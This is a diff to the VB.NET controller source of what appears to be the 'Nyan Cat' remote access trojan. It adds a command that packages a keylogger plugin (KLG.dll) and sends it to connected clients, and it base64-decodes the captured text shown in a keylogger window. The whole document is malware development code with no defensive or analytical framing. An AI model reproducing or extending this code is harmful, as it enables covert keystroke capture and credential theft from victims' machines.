@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##         N Y A N   C A T  |||   Updated on Aug/11/2018        ##
+'##         N Y A N   C A T  |||   Updated on Aug/12/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -756,7 +756,7 @@ Public Class Main
                         KL.Show()
                     End If
 
-                    KL.RichTextBox1.Text = A(2)
+                    KL.RichTextBox1.Text = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(A(2)))
                     Exit Select
 
 #End Region
@@ -771,7 +771,6 @@ Public Class Main
 #Region "Send Plugin"
                 Case "GPL"
                     Dim Folderx = IO.Directory.GetFiles(Application.StartupPath & "\Misc\Plugins")
-
                     For Each file In Folderx
                         Dim HASH = getMD5Hash(IO.File.ReadAllBytes(file))
 
@@ -788,6 +787,11 @@ Public Class Main
                 Case "PLPIN"
                     S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PIN.dll"), True)) + SPL + "_PIN")
                     Exit Select
+
+                Case "PLKLG"
+                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\KLG.dll"), True)) + SPL + "_KLG")
+                    Exit Select
+
 #End Region
 
 #Region "Messages"
